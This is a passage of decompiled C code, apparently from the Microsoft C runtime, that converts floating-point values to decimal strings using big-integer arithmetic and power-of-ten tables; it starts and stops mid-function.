    "  unsigned int v37; // eax",
    "  unsigned int v38; // esi",
    "  int *v39; // ecx",
    "  unsigned int v40; // eax",
    "  unsigned int v41; // eax",
    "  unsigned int v42; // ecx",
    "  unsigned int v43; // eax",
    "  int v44; // ecx",
    "  int v45; // eax",
    "  int v46; // eax",
    "  unsigned int v47; // esi",
    "  unsigned int v48; // ecx",
    "  unsigned int v49; // ebx",
    "  unsigned int v50; // edi",
    "  int v51; // eax",
    "  unsigned int v52; // edx",
    "  char v53; // bl",
    "  unsigned int v54; // edi",
    "  int v55; // eax",
    "  int v56; // eax",
    "  unsigned int v57; // esi",
    "  unsigned int v58; // ecx",
    "  unsigned int v59; // ebx",
    "  unsigned int v60; // edi",
    "  int v61; // eax",
    "  unsigned int v62; // edx",
    "  char v63; // bl",
    "  unsigned int v64; // eax",
    "  unsigned int v65; // ecx",
    "  int v66; // ecx",
    "  int v67; // esi",
    "  int v68; // ecx",
    "  int v69; // edi",
    "  int v70; // edx",
    "  unsigned int v71; // esi",
    "  int v72; // edi",
    "  unsigned __int64 v73; // rax",
    "  int v74; // kr00_4",
    "  char v75; // al",
    "  int v76; // esi",
    "  int v77; // edi",
    "  unsigned __int64 v78; // rax",
    "  int v79; // kr04_4",
    "  int *v80; // esi",
    "  int *v81; // esi",
    "  char *v82; // esi",
    "  unsigned int v83; // eax",
    "  int v84; // edi",
    "  unsigned int v85; // ecx",
    "  int v86; // esi",
    "  unsigned int v87; // edx",
    "  unsigned __int64 v88; // rax",
    "  bool v89; // cf",
    "  unsigned int v90; // ecx",
    "  _DWORD *v91; // eax",
    "  _DWORD *v92; // ecx",
    "  char *v93; // eax",
    "  int v94; // eax",
    "  int v95; // esi",
    "  int j; // edi",
    "  unsigned __int64 v97; // rax",
    "  int v98; // edx",
    "  unsigned int v99; // eax",
    "  int v100; // ecx",
    "  int v101; // esi",
    "  int v102; // ecx",
    "  int v103; // edi",
    "  unsigned int v104; // edx",
    "  int v105; // esi",
    "  unsigned int v106; // ecx",
    "  int v107; // edi",
    "  unsigned __int64 v108; // rax",
    "  int v109; // kr08_4",
    "  char v110; // al",
    "  unsigned int v111; // edi",
    "  int v112; // esi",
    "  unsigned __int64 v113; // rax",
    "  int v114; // kr0C_4",
    "  int *p_Source; // esi",
    "  int *v116; // esi",
    "  unsigned int v117; // esi",
    "  unsigned int v118; // eax",
    "  int v119; // edi",
    "  int *v120; // ecx",
    "  int v121; // esi",
    "  unsigned int v122; // edx",
    "  unsigned __int64 v123; // rax",
    "  unsigned int v124; // ecx",
    "  _DWORD *v125; // eax",
    "  _DWORD *v126; // ecx",
    "  char *v127; // eax",
    "  int v128; // eax",
    "  unsigned int v129; // ecx",
    "  int v130; // esi",
    "  int v131; // edi",
    "  unsigned __int64 v132; // rax",
    "  int v133; // edx",
    "  char *v134; // edi",
    "  char *v135; // esi",
    "  unsigned int v136; // ecx",
    "  unsigned int v137; // edi",
    "  int v138; // esi",
    "  __int64 v139; // rax",
    "  int v140; // kr10_4",
    "  unsigned __int64 v141; // rax",
    "  int v142; // eax",
    "  unsigned int v143; // eax",
    "  unsigned int v144; // ecx",
    "  unsigned int v145; // esi",
    "  int k; // edi",
    "  __int64 v147; // rax",
    "  int v148; // eax",
    "  char *v149; // ecx",
    "  char v150; // dl",
    "  unsigned int v151; // ecx",
    "  unsigned int v152; // esi",
    "  int n; // edi",
    "  __int64 v154; // rax",
    "  int v155; // kr18_4",
    "  unsigned __int64 v156; // rax",
    "  char *v157; // esi",
    "  unsigned int v158; // eax",
    "  unsigned int v159; // ecx",
    "  char *v160; // edi",
    "  int v161; // et2",
    "  char v162; // dl",
    "  int v163; // eax",
    "  _BYTE v165[460]; // [esp+18h] [ebp-B40h] BYREF",
    "  int v166; // [esp+1E4h] [ebp-974h]",
    "  _BYTE v167[460]; // [esp+1E8h] [ebp-970h] BYREF",
    "  int v168; // [esp+3B4h] [ebp-7A4h] BYREF",
    "  fenv_t Env; // [esp+3B8h] [ebp-7A0h] BYREF",
    "  char v170; // [esp+3C0h] [ebp-798h]",
    "  int v171; // [esp+3C4h] [ebp-794h] BYREF",
    "  int v172; // [esp+3C8h] [ebp-790h]",
    "  int *v173; // [esp+3CCh] [ebp-78Ch]",
    "  char *v174; // [esp+3D0h] [ebp-788h]",
    "  int v175; // [esp+3D4h] [ebp-784h]",
    "  int v176; // [esp+3D8h] [ebp-780h]",
    "  unsigned int v177; // [esp+3DCh] [ebp-77Ch]",
    "  __int64 v178; // [esp+3E0h] [ebp-778h]",
    "  __int64 v179; // [esp+3E8h] [ebp-770h] BYREF",
    "  unsigned int v180; // [esp+3F0h] [ebp-768h]",
    "  char *v181; // [esp+3F4h] [ebp-764h]",
    "  unsigned int v182; // [esp+3F8h] [ebp-760h]",
    "  unsigned int v183; // [esp+3FCh] [ebp-75Ch]",
    "  unsigned int v184; // [esp+400h] [ebp-758h]",
    "  int *v185; // [esp+404h] [ebp-754h]",
    "  char m; // [esp+40Bh] [ebp-74Dh]",
    "  unsigned int v187; // [esp+40Ch] [ebp-74Ch]",
    "  char *v188; // [esp+410h] [ebp-748h]",
    "  unsigned int v189; // [esp+414h] [ebp-744h]",
    "  _DWORD v190[115]; // [esp+418h] [ebp-740h] BYREF",
    "  unsigned int v191; // [esp+5E4h] [ebp-574h]",
    "  int Source; // [esp+5E8h] [ebp-570h] BYREF",
    "  int v193; // [esp+5ECh] [ebp-56Ch]",
    "  unsigned int v194; // [esp+7B4h] [ebp-3A4h] BYREF",
    "  _DWORD v195[115]; // [esp+7B8h] [ebp-3A0h] BYREF",
    "  unsigned int v196; // [esp+984h] [ebp-1D4h] BYREF",
    "  _DWORD Destination[115]; // [esp+988h] [ebp-1D0h] BYREF",
    "",
    "  v173 = a4;",
    "  v181 = a5;",
    "  fegetenv(&Env);",
    "  v6 = 1;",
    "  if ( (Env._Fe_ctl & 0x1F) == 0x1F )",
    "  {",
    "    v170 = 0;",
    "  }",
    "  else",
    "  {",
    "    sub_1002A200(&Env);",
    "    v170 = 1;",
    "  }",
    "  v7 = HIDWORD(a1);",
    "  if ( a1 < 0 )",
    "    v8 = 45;",
    "  else",
    "    v8 = 32;",
    "  v9 = v173;",
    "  *v173 = v8;",
    "  v9[2] = (int)v181;",
    "  sub_1002A110(&v168, 0, 0);",
    "  if ( (v7 & 0x7FF00000) == 0 && (!(v7 & 0xFFFFF | (unsigned int)a1) || (v168 & 0x1000000) != 0) )",
    "  {",
    "    v173[1] = 0;",
    "    v10 = strcpy_s(v181, SizeInBytes, \"0\");",
    "    goto LABEL_19;",
    "  }",
    "  v11 = __acrt_fp_classify((int *)&a1);",
    "  if ( !v11 )",
    "    goto LABEL_23;",
    "  v173[1] = 1;",
    "  v12 = v11 - 1;",
    "  if ( !v12 )",
    "  {",
    "    if ( !strcpy_s(v181, SizeInBytes, \"1#INF\") )",
    "    {",
    "      v6 = 0;",
    "      goto LABEL_298;",
    "    }",
    "    goto LABEL_301;",
    "  }",
    "  v13 = v12 - 1;",
    "  if ( !v13 )",
    "  {",
    "    v10 = strcpy_s(v181, SizeInBytes, \"1#QNAN\");",
    "LABEL_19:",
    "    if ( !v10 )",
    "      goto LABEL_298;",
    "LABEL_301:",
    "    _invoke_watson(0, 0, 0, 0, 0);",
    "  }",
    "  v14 = v13 - 1;",
    "  if ( !v14 )",
    "  {",
    "    v10 = strcpy_s(v181, SizeInBytes, \"1#SNAN\");",
    "    goto LABEL_19;",
    "  }",
    "  if ( v14 == 1 )",
    "  {",
    "    v10 = strcpy_s(v181, SizeInBytes, \"1#IND\");",
    "    goto LABEL_19;",
    "  }",
    "LABEL_23:",
    "  HIDWORD(a1) = v7 & 0x7FFFFFFF;",
    "  v172 = 524319;",
    "  sub_1002A110(&v171, 0, 0);",
    "  sub_1002A110((char *)&v179 + 4, 524319, v172);",
    "  v178 = a1;",
    "  v174 = (char *)(a2 + 1);",
    "  HIDWORD(v179) = 0;",
    "  if ( ((HIDWORD(a1) >> 20) & 0x7FF) != 0 )",
    "  {",
    "    v185 = 0;",
    "    v15 = 0;",
    "    v16 = 0x100000;",
    "  }",
    "  else",
    "  {",
    "    v15 = 1;",
    "    *(double *)&v179 = 0.0;",
    "    v16 = 0;",
    "    v185 = 0;",
    "  }",
    "  v177 = (unsigned int)v185 + v178;",
    "  v17 = v16 + __CFADD__(v185, (_DWORD)v178) + (HIDWORD(a1) & 0xFFFFF);",
    "  v188 = (char *)(((HIDWORD(a1) >> 20) & 0x7FF) + v15);",
    "  v179 = _libm_sse2_log10_precise().m128_u64[0];",
    "  *(double *)&v179 = sub_1002A550(v179);",
    "  v182 = (int)*(double *)&v179;",
    "  if ( (int)*(double *)&v179 == 0x7FFFFFFF || (int)*(double *)&v179 == 0x80000000 )",
    "    v182 = 0;",
    "  Destination[0] = v177;",
    "  v18 = v188;",
    "  Destination[1] = v17;",
    "  v194 = 0;",
    "  v19 = (v17 != 0) + 1;",
    "  v196 = v19;",
    "  if ( (unsigned int)v188 < 0x433 )",
    "  {",
    "    if ( v188 != (char *)53 )",
    "    {",
    "      Source = 0;",
    "      v193 = 0x100000;",
    "      v191 = 2;",
    "      if ( v17 )",
    "      {",
    "        v44 = 0;",
    "        while ( *(int *)((char *)&Source + v44 * 4) == Destination[v44] )",
    "        {",
    "          if ( ++v44 == 2 )",
    "          {",
    "            v21 = !_BitScanReverse((unsigned int *)&v45, v17);",
    "            HIDWORD(v179) = 0;",
    "            if ( v21 )",
    "              v46 = 0;",
    "            else",
    "              v46 = v45 + 1;",
    "            v47 = v19 + ((unsigned int)(32 - v46) < 2);",
    "            if ( v47 <= 0x73 )",
    "            {",
    "              v48 = v47 - 1;",
    "              if ( v47 )",
    "              {",
    "                v49 = v47 - 2;",
    "                while ( 1 )",
    "                {",
    "                  v50 = v48;",
    "                  v51 = v48 >= v19 ? 0 : Destination[v48];",
    "                  v52 = v49-- >= v19 ? 0 : Destination[--v48];",
    "                  Destination[v50] = (4 * v51) | (v52 >> 30);",
    "                  if ( v48 == -1 )",
    "                    break;",
    "                  v19 = v196;",
    "                }",
    "              }",
    "              v196 = v47;",
    "            }",
    "            else",
    "            {",
    "              v191 = 0;",
    "              v196 = 0;",
    "              memcpy_s(Destination, 0x1CCu, &Source, 0);",
    "            }",
    "            v53 = 53 - (_BYTE)v188;",
    "            v54 = (unsigned int)(1077 - (_DWORD)v188) >> 5;",
    "            memset(&Source, 0, 4 * v54);",
    "            *(&Source + v54) = 1 << (v53 & 0x1F);",
    "            goto LABEL_121;",
    "          }",
    "        }",
    "      }",
    "    }",
    "    v55 = 8;",
    "    if ( !v17 )",
    "      v55 = 4;",
    "    HIDWORD(v179) = 0;",
    "    v21 = !_BitScanReverse((unsigned int *)&v55, *(_DWORD *)((char *)&Destination[-1] + v55));",
    "    if ( v21 )",
    "      v56 = 0;",
    "    else",
    "      v56 = v55 + 1;",
    "    v57 = v19 + (v56 == 32);",
    "    if ( v57 <= 0x73 )",
    "    {",
    "      v58 = v57 - 1;",
    "      if ( v57 )",
    "      {",
    "        v59 = v57 - 2;",
    "        while ( 1 )",
    "        {",
    "          v60 = v58;",
    "          v61 = v58 >= v19 ? 0 : Destination[v58];",
    "          v62 = v59-- >= v19 ? 0 : Destination[--v58];",
    "          Destination[v60] = (2 * v61) | (v62 >> 31);",
    "          if ( v58 == -1 )",
    "            break;",
    "          v19 = v196;",
    "        }",
    "      }",
    "      v196 = v57;",
    "    }",
    "    else",
    "    {",
    "      v191 = 0;",
    "      v196 = 0;",
    "      memcpy_s(Destination, 0x1CCu, &Source, 0);",
    "    }",
    "    v63 = 52 - (_BYTE)v188;",
    "    v54 = (unsigned int)(1076 - (_DWORD)v188) >> 5;",
    "    memset(&Source, 0, 4 * v54);",
    "    *(&Source + v54) = 1 << (v63 & 0x1F);",
    "LABEL_121:",
    "    v191 = v54 + 1;",
    "    v194 = v54 + 1;",
    "    memcpy_s(v195, 0x1CCu, &Source, 4 * (v54 + 1));",
    "    v6 = 1;",
    "  }",
    "  else",
    "  {",
    "    Source = 0;",
    "    v193 = 0x100000;",
    "    v191 = 2;",
    "    if ( v17 )",
    "    {",
    "      for ( i = 0; i != 2; ++i )",
    "      {",
    "        if ( *(int *)((char *)&Source + i * 4) != Destination[i] )",
    "        {",
    "          v18 = v188;",
    "          goto LABEL_57;",
    "        }",
    "      }",
    "      v184 = (unsigned int)(v188 - 1073) >> 5;",
    "      v183 = (unsigned int)(v188 - 1073) & 0x1F;",
    "      v176 = 32 - v183;",
    "      HIDWORD(v179) = 0;",
    "      v175 = (1 << (32 - v183)) - 1;",
    "      v177 = ~v175;",
    "      v21 = !_BitScanReverse((unsigned int *)&v22, Destination[v19 - 1]);",
    "      if ( v21 )",
    "        v185 = 0;",
    "      else",
    "        v185 = (int *)(v22 + 1);",
    "      v23 = v184;",
    "      if ( v184 + v19 > 0x73 || (v24 = v19 + v184 + (32 - (int)v185 < v183), HIDWORD(v178) = v24, v24 > 0x73) )",
    "      {",
    "        v191 = 0;",
    "        v196 = 0;",
    "        memcpy_s(Destination, 0x1CCu, &Source, 0);",
    "      }",
    "      else",
    "      {",
    "        v180 = v184 - 1;",
    "        v25 = v24 - 1;",
    "        v187 = v24 - 1;",
    "        if ( v24 - 1 != v184 - 1 )",
    "        {",
    "          v26 = v25 - v184;",
    "          v27 = (char *)&Destination[v25 - v184 - 1];",
    "          v188 = v27;",
    "          while ( 1 )",
    "          {",
    "            v28 = v26 >= v19 ? 0 : (int *)*((_DWORD *)v27 + 1);",
    "            v185 = v28;",
    "            v29 = v26 - 1 >= v19 ? 0 : *(_DWORD *)v27;",
    "            v30 = v187;",
    "            Destination[v187] = ((v175 & (unsigned int)v185) << v183) | ((v177 & v29) >> v176);",
    "            v31 = v30 - 1;",
    "            v27 = v188 - 4;",
    "            v187 = v31;",
    "            --v26;",
    "            v188 -= 4;",
    "            if ( v31 == v180 )",
    "              break;",
    "            v19 = v196;",
    "          }",
    "          v24 = HIDWORD(v178);",
    "          v23 = v184;",
    "        }",
    "        if ( v23 )",
    "          memset(Destination, 0, 4 * v23);",
    "        v196 = v24;",
    "      }",
    "      Source = 4;",
    "    }",
    "    else",
    "    {",
    "LABEL_57:",
    "      v32 = v18 - 1074;",
    "      v188 = (char *)((unsigned int)v32 >> 5);",
    "      v180 = (unsigned __int8)v32 & 0x1F;",
    "      v33 = 32 - v180;",
    "      v175 = 32 - v180;",
    "      v34 = 0;",
    "      if ( 32 - v180 >= 0x20 )",
    "        v34 = 1 << v33;",
    "      HIDWORD(v179) = 0;",
    "      v176 = (v34 ^ (1 << v33)) - 1;",
    "      HIDWORD(v178) = ~v176;",
    "      v21 = !_BitScanReverse((unsigned int *)&v34, Destination[v19 - 1]);",
    "      if ( v21 )",
    "        v184 = 0;",
    "      else",
    "        v184 = v34 + 1;",
    "      v35 = v188;",
    "      if ( (unsigned int)&v188[v19] > 0x73",
    "        || (v36 = (unsigned int)&v188[(32 - v184 < v180) + v19], v177 = v36, v36 > 0x73) )",
    "      {",
    "        v191 = 0;",
    "        v196 = 0;",
    "        memcpy_s(Destination, 0x1CCu, &Source, 0);",
    "      }",
    "      else",
    "      {",
    "        v183 = (unsigned int)(v188 - 1);",
    "        v37 = v36 - 1;",
    "        v187 = v36 - 1;",
    "        if ( (char *)(v36 - 1) != v188 - 1 )",
    "        {",
    "          v38 = v37 - (_DWORD)v188;",
    "          v39 = &Destination[v37 - (_DWORD)v188 - 1];",
    "          v185 = v39;",
    "          while ( 1 )",
    "          {",
    "            v40 = v38 >= v19 ? 0 : v39[1];",
    "            v184 = v40;",
    "            v41 = v38 - 1 >= v19 ? 0 : *v39;",
    "            v42 = v187;",
    "            Destination[v187] = ((v176 & v184) << v180) | ((HIDWORD(v178) & v41) >> v175);",
    "            v43 = v42 - 1;",
    "            v39 = v185 - 1;",
    "            v187 = v43;",
    "            --v38;",
    "            --v185;",
    "            if ( v43 == v183 )",
    "              break;",
    "            v19 = v196;",
    "          }",
    "          v36 = v177;",
    "          v35 = v188;",
    "        }",
    "        if ( v35 )",
    "          memset(Destination, 0, 4 * (_DWORD)v35);",
    "        v196 = v36;",
    "      }",
    "      Source = 2;",
    "    }",
    "    v193 = 0;",
    "    v194 = 1;",
    "    v191 = 1;",
    "    memcpy_s(v195, 0x1CCu, &Source, 4u);",
    "  }",
    "  v177 = 10;",
    "  if ( (v182 & 0x80000000) != 0 )",
    "  {",
    "    HIDWORD(v179) = -v182;",
    "    v99 = -v182 / 0xA;",
    "    v180 = v99;",
    "    if ( !v99 )",
    "    {",
    "LABEL_239:",
    "      if ( !(HIDWORD(v179) % 0xA) )",
    "        goto LABEL_250;",
    "      v128 = dword_10033C24[HIDWORD(v179) % 0xA];",
    "      HIDWORD(v179) = v128;",
    "      if ( v128 )",
    "      {",
    "        if ( v128 == 1 )",
    "          goto LABEL_250;",
    "        v129 = v196;",
    "        if ( !v196 )",
    "          goto LABEL_250;",
    "        v130 = 0;",
    "        v131 = 0;",
    "        do",
    "        {",
    "          v132 = (unsigned int)Destination[v131] * (unsigned __int64)(unsigned int)v128;",
    "          v89 = __CFADD__(v130, (_DWORD)v132);",
    "          Destination[v131] = v130 + v132;",
    "          v128 = HIDWORD(v179);",
    "          v133 = v89 + HIDWORD(v132);",
    "          ++v131;",
    "          v130 = v133;",
    "        }",
    "        while ( v131 != v129 );",
    "        if ( !v133 )",
    "          goto LABEL_250;",
    "        if ( v196 < 0x73 )",
    "        {",
    "          Destination[v196++] = v133;",
    "          goto LABEL_250;",
    "        }",
    "      }",
    "      goto LABEL_249;",
    "    }",
    "    while ( 1 )",
    "    {",
    "      v100 = v99;",
    "      if ( v99 > 0x26 )",
    "        v100 = 38;",
    "      v184 = v100;",
    "      v101 = (unsigned __int8)byte_10033B8F[4 * v100];",
    "      v102 = (unsigned __int8)byte_10033B8E[4 * v100];",
    "      v103 = 4 * v102;",
    "      v191 = v102 + v101;",
    "      memset(&Source, 0, 4 * v102);",
    "      memmove((char *)&Source + v103, (char *)&unk_10033288 + 4 * (unsigned __int16)word_10033B8C[2 * v184], 4 * v101);",
    "      v104 = v191;",
    "      if ( v191 > 1 )",
    "      {",
    "        if ( v196 > 1 )",
    "        {",
    "          p_Source = &Source;",
    "          if ( v191 >= v196 )",
    "            p_Source = Destination;",
    "          v185 = p_Source;",
    "          v116 = Destination;",
    "          if ( v191 >= v196 )",
    "            v116 = &Source;",
    "          HIDWORD(v178) = v116;",
    "          v117 = v196;",
    "          if ( v191 < v196 )",
    "            v117 = v191;",
    "          v176 = v117;",
    "          if ( v191 < v196 )",
    "            v104 = v196;",
    "          v118 = 0;",
    "          v119 = 0;",
    "          v175 = v104;",
    "          v189 = 0;",
    "          v120 = v185;",
    "          do",
    "          {",
    "            if ( v120[v119] )",
    "            {",
    "              v188 = 0;",
    "              v121 = v119;",
    "              v187 = 0;",
    "              if ( v104 )",
    "              {",
    "                do",
    "                {",
    "                  if ( v121 == 115 )",
    "                    break;",
    "                  v122 = v187;",
    "                  if ( v121 == v118 )",
    "                  {",
    "                    v190[v121] = 0;",
    "                    v189 = v119 + v122 + 1;",
    "                  }",
    "                  v123 = (unsigned int)v190[v121]",
    "                       + (unsigned int)v185[v119] * (unsigned __int64)*(unsigned int *)(HIDWORD(v178) + 4 * v122);",
    "                  v89 = __CFADD__(v188, (_DWORD)v123);",
    "                  v190[v121] = &v188[v123];",
    "                  v118 = v189;",
    "                  v188 = (char *)(v89 + HIDWORD(v123));",
    "                  ++v121;",
    "                  v104 = v175;",
    "                  ++v187;",
    "                }",
    "                while ( v187 != v175 );",
    "                if ( v188 )",
    "                {",
    "                  v183 = (unsigned int)&v190[v121];",
    "                  while ( v121 != 115 )",
    "                  {",
    "                    v124 = v121 + 1;",
    "                    v21 = v121 == v118;",
    "                    v125 = (_DWORD *)v183;",
    "                    ++v121;",
    "                    if ( v21 )",
    "                    {",
    "                      *(_DWORD *)v183 = 0;",
    "                      v189 = v124;",
    "                    }",
    "                    v126 = v125;",
    "                    v183 = (unsigned int)(v125 + 1);",
    "                    v127 = v188;",
    "                    v188 = 0;",
    "                    v89 = __CFADD__(v127, *v126);",
    "                    *v126 += v127;",
    "                    v118 = v189;",
    "                    v188 += v89;",
    "                    if ( !v188 )",
    "                      goto LABEL_232;",
    "                  }",
    "LABEL_248:",
    "                  v196 = 0;",
    "                  memcpy_s(Destination, 0x1CCu, v165, 0);",
    "LABEL_249:",
    "                  v166 = 0;",
    "                  v196 = 0;",
    "                  memcpy_s(Destination, 0x1CCu, v167, 0);",
    "                  goto LABEL_250;",
    "                }",
    "              }",
    "LABEL_232:",
    "              if ( v121 == 115 )",
    "                goto LABEL_248;",
    "              v117 = v176;",
    "              v120 = v185;",
    "            }",
    "            else if ( v119 == v118 )",
    "            {",
    "              v190[v119] = 0;",
    "              v118 = v119 + 1;",
    "              v189 = v119 + 1;",
    "            }",
    "            ++v119;",
    "          }",
    "          while ( v119 != v117 );",
    "          v196 = v118;",
    "          memcpy_s(Destination, 0x1CCu, v190, 4 * v118);",
    "          goto LABEL_236;",
    "        }",
    "        v111 = Destination[0];",
    "        v196 = v191;",
    "        memcpy_s(Destination, 0x1CCu, &Source, 4 * v191);",
    "        if ( !v111 )",
    "        {",
    "LABEL_193:",
    "          v166 = 0;",
    "          v196 = 0;",
    "          memcpy_s(Destination, 0x1CCu, v167, 0);",
    "LABEL_236:",
    "          v110 = 1;",
    "          goto LABEL_237;",
    "        }",
    "        if ( v111 == 1 || !v196 )",
    "          goto LABEL_236;",
    "        v106 = 0;",
    "        HIDWORD(v178) = v196;",
    "        v112 = 0;",
    "        do",
    "        {",
    "          v113 = (unsigned int)Destination[v112] * (unsigned __int64)v111;",
    "          v114 = Destination[v112] * v111;",
    "          Destination[v112++] = v106 + v114;",
    "          v106 = (__PAIR64__(HIDWORD(v113), v106) + (unsigned int)v114) >> 32;",
    "        }",
    "        while ( v112 != HIDWORD(v178) );",
    "      }",
    "      else",
    "      {",
    "        v105 = Source;",
    "        if ( !Source )",
    "          goto LABEL_193;",
    "        if ( Source == 1 || !v196 )",
    "          goto LABEL_236;",
    "        v106 = 0;",
    "        HIDWORD(v178) = v196;",
    "        v107 = 0;",
    "        do",
    "        {",
    "          v108 = (unsigned int)Destination[v107] * (unsigned __int64)(unsigned int)v105;",
    "          v109 = Destination[v107] * v105;",
    "          Destination[v107++] = v106 + v109;",
    "          v106 = (__PAIR64__(HIDWORD(v108), v106) + (unsigned int)v109) >> 32;",
    "        }",
    "        while ( v107 != HIDWORD(v178) );",
    "      }",
    "      if ( !v106 )",
    "        goto LABEL_236;",
    "      if ( v196 < 0x73 )",
    "      {",
    "        Destination[v196++] = v106;",
    "        goto LABEL_236;",
    "      }",
    "      v166 = 0;",
    "      v196 = 0;",
    "      memcpy_s(Destination, 0x1CCu, v167, 0);",
    "      v110 = 0;",
    "LABEL_237:",
    "      if ( !v110 )",
    "        goto LABEL_249;",
    "      v99 = v180 - v184;",
    "      v180 -= v184;",
    "      if ( !v180 )",
    "        goto LABEL_239;",
    "    }",
    "  }",
    "  v64 = v182 / 0xA;",
    "  v65 = v194;",
    "  v180 = v182 / 0xA;",
    "  if ( v182 / 0xA )",
    "  {",
    "    v188 = (char *)v194;",
    "    do",
    "    {",
    "      v66 = v64;",
    "      if ( v64 > 0x26 )",
    "        v66 = 38;",
    "      v184 = v66;",
    "      v67 = (unsigned __int8)byte_10033B8F[4 * v66];",
    "      v68 = (unsigned __int8)byte_10033B8E[4 * v66];",
    "      v69 = 4 * v68;",
    "      v191 = v68 + v67;",
    "      memset(&Source, 0, 4 * v68);",
    "      memmove((char *)&Source + v69, (char *)&unk_10033288 + 4 * (unsigned __int16)word_10033B8C[2 * v184], 4 * v67);",
    "      v70 = v191;",
    "      if ( v191 > 1 )",
    "      {",
    "        if ( (unsigned int)v188 > 1 )",
    "        {",
    "          v80 = &Source;",
    "          if ( v191 >= (unsigned int)v188 )",
    "            v80 = v195;",
    "          v183 = (unsigned int)v80;",
    "          v81 = v195;",
    "          if ( v191 >= (unsigned int)v188 )",
    "            v81 = &Source;",
    "          HIDWORD(v178) = v81;",
    "          v82 = v188;",
    "          if ( v191 < (unsigned int)v188 )",
    "            v82 = (char *)v191;",
    "          v176 = (int)v82;",
    "          if ( v191 < (unsigned int)v188 )",
    "            v70 = (int)v188;",
    "          v83 = 0;",
    "          v84 = 0;",
    "          v175 = v70;",
    "          v189 = 0;",
    "          v85 = v183;",
    "          while ( 1 )",
    "          {",
    "            if ( *(_DWORD *)(v85 + 4 * v84) )",
    "            {",
    "              v188 = 0;",
    "              v86 = v84;",
    "              v187 = 0;",
    "              if ( v70 )",
    "              {",
    "                do",
    "                {",
    "                  if ( v86 == 115 )",
    "                    break;",
    "                  v87 = v187;",
    "                  if ( v86 == v83 )",
    "                  {",
    "                    v190[v86] = 0;",
    "                    v189 = v84 + v87 + 1;",
    "                  }",
    "                  v88 = (unsigned __int64)&v188[*(unsigned int *)(v183 + 4 * v84)",
    "                                              * (unsigned __int64)*(unsigned int *)(HIDWORD(v178) + 4 * v87)];",
    "                  v89 = __CFADD__((_DWORD)v88, v190[v86]);",
    "                  v190[v86] += v88;",
    "                  v83 = v189;",
    "                  v188 = (char *)(v89 + HIDWORD(v88));",
    "                  v70 = v175;",
    "                  ++v86;",
    "                  ++v187;",
    "                }",
    "                while ( v187 != v175 );",
    "                if ( v188 )",
    "                {",
    "                  v187 = (unsigned int)&v190[v86];",
    "                  while ( v86 != 115 )",
    "                  {",
    "                    v90 = v86 + 1;",
    "                    v21 = v86 == v83;",
    "                    v91 = (_DWORD *)v187;",
    "                    ++v86;",
    "                    if ( v21 )",
    "                    {",
    "                      *(_DWORD *)v187 = 0;",
    "                      v189 = v90;",
    "                    }",
    "                    v92 = v91;",
    "                    v187 = (unsigned int)(v91 + 1);",
    "                    v93 = v188;",
    "                    v188 = 0;",
    "                    v89 = __CFADD__(v93, *v92);",
    "                    *v92 += v93;",
    "                    v83 = v189;",
    "                    v188 += v89;",
    "                    if ( !v188 )",
    "                      goto LABEL_168;",
    "                  }",
    "LABEL_186:",
    "                  v194 = 0;",
    "                  memcpy_s(v195, 0x1CCu, v165, 0);",
    "LABEL_187:",
    "                  v166 = 0;",
    "                  v194 = 0;",
    "                  memcpy_s(v195, 0x1CCu, v167, 0);",
    "                  goto LABEL_250;",
    "                }",
    "              }",
    "LABEL_168:",
    "              if ( v86 == 115 )",
    "                goto LABEL_186;",
    "              v82 = (char *)v176;",
    "              v85 = v183;",
    "            }",
    "            else if ( v84 == v83 )",
    "            {",
    "              v190[v84] = 0;",
    "              v83 = v84 + 1;",
    "              v189 = v84 + 1;",
    "            }",
    "            if ( (char *)++v84 == v82 )",
    "            {",
    "              v194 = v83;",
    "              memcpy_s(v195, 0x1CCu, v190, 4 * v83);",
    "              goto LABEL_172;",
    "            }",
    "          }",
    "        }",
    "        v76 = v195[0];",
    "        HIDWORD(v178) = v195[0];",
    "        v194 = v191;",
    "        memcpy_s(v195, 0x1CCu, &Source, 4 * v191);",
    "        if ( !v76 )",
    "        {",
    "LABEL_129:",
    "          v191 = 0;",
    "          v194 = 0;",
    "          memcpy_s(v195, 0x1CCu, &Source, 0);",
    "LABEL_172:",
    "          v65 = v194;",
    "          goto LABEL_173;",
    "        }",
    "        v65 = v194;",
    "        v188 = (char *)v194;",
    "        if ( v76 == 1 || !v194 )",
    "          goto LABEL_174;",
    "        v71 = 0;",
    "        v77 = 0;",
    "        do",
    "        {",
    "          v78 = (unsigned int)v195[v77] * (unsigned __int64)HIDWORD(v178);",
    "          v79 = v195[v77] * HIDWORD(v178);",
    "          v195[v77++] = v71 + v79;",
    "          v71 = (__PAIR64__(HIDWORD(v78), v71) + (unsigned int)v79) >> 32;",
    "        }",
    "        while ( v77 != v65 );",
    "      }",
    "      else",
    "      {",
    "        if ( !Source )",
    "          goto LABEL_129;",
    "        v65 = (unsigned int)v188;",
    "        if ( Source == 1 || !v188 )",
    "          goto LABEL_174;",
    "        v71 = 0;",
    "        v72 = 0;",
    "        do",
    "        {",
    "          v73 = (unsigned int)v195[v72] * (unsigned __int64)(unsigned int)Source;",
    "          v74 = v195[v72] * Source;",
    "          v195[v72++] = v71 + v74;",
    "          v71 = (__PAIR64__(HIDWORD(v73), v71) + (unsigned int)v74) >> 32;",
    "        }",
    "        while ( v72 != v65 );",
    "      }",
    "      if ( !v71 )",
    "        goto LABEL_172;",
    "      if ( v194 < 0x73 )",
    "      {",
    "        v195[v194] = v71;",
    "        v65 = ++v194;",
    "LABEL_173:",
    "        v188 = (char *)v65;",
    "LABEL_174:",
    "        v75 = 1;",
    "        goto LABEL_175;",
    "      }",
    "      v191 = 0;",
    "      v194 = 0;",
    "      memcpy_s(v195, 0x1CCu, &Source, 0);",
    "      v65 = v194;",
    "      v75 = 0;",
    "      v188 = (char *)v194;",
    "LABEL_175:",
    "      if ( !v75 )",
    "        goto LABEL_187;",
    "      v64 = v180 - v184;",
    "      v180 -= v184;",
    "    }",
    "    while ( v180 );",
    "  }",
    "  if ( v182 % 0xA )",
    "  {",
    "    v94 = dword_10033C24[v182 % 0xA];",
    "    HIDWORD(v178) = v94;",
    "    if ( !v94 )",
    "      goto LABEL_187;",
    "    if ( v94 != 1 )",
    "    {",
    "      if ( v65 )",
    "      {",
    "        v95 = 0;",
    "        for ( j = 0; j != v65; ++j )",
    "        {",
    "          v97 = (unsigned int)v195[j] * (unsigned __int64)(unsigned int)v94;",
    "          v89 = __CFADD__(v95, (_DWORD)v97);",
    "          v195[j] = v95 + v97;",
    "          v94 = HIDWORD(v178);",
    "          v98 = v89 + HIDWORD(v97);",
    "          v95 = v98;",
    "        }",
    "        if ( v98 )",
    "        {",
